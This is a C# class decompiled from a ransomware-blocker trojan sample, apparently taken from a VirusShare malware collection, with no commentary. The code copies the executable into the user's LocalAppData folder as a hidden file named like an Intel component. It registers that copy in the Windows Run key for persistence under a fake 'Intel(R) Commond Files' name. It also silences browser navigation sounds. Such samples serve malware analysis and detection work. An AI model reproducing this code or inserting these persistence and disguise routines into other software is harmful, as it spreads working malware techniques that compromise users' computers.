// Decompiled with JetBrains decompiler
// Type: browser_bastan.Araclar
// Assembly: Intel(R) Commond Files, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4789B8F2-D08C-4BC2-91CF-57FD360C053D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.klat-f56b16f98c4c9b907f6ed3588a7ca87de87db179ea551b0f46e749fb42dae175.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace browser_bastan
{
  public class Araclar
  {
    private const string RegKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    private const int FEATURE_DISABLE_NAVIGATION_SOUNDS = 21;
    private const int SET_FEATURE_ON_PROCESS = 2;
    public static string Regkeyname = "Intel(R) Commond Files";
    public static string DstName = "intelcf.exe";

    [DllImport("urlmon.dll")]
    [return: MarshalAs(UnmanagedType.Error)]
    private static extern int CoInternetSetFeatureEnabled(
      int FeatureEntry,
      [MarshalAs(UnmanagedType.U4)] int dwFlags,
      bool fEnable);

    public static void DisableClickSounds() => Araclar.CoInternetSetFeatureEnabled(21, 2, true);

    public static void Copy(string src, string dst)
    {
      if (File.Exists(dst))
        File.SetAttributes(dst, FileAttributes.Normal);
      try
      {
        File.Copy(src, dst, true);
      }
      catch (Exception ex)
      {
      }
      File.SetAttributes(dst, FileAttributes.Hidden);
    }

    public static void Startup(string name, string path)
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      if (registryKey == null)
        return;
      registryKey.SetValue(name, (object) path);
      registryKey.Close();
    }

    public static void DstCheck()
    {
      string location = Assembly.GetExecutingAssembly().Location;
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
      if (Path.GetDirectoryName(location) == folderPath)
        return;
      Araclar.Copy(location, folderPath + "\\" + Araclar.DstName);
    }
  }
}
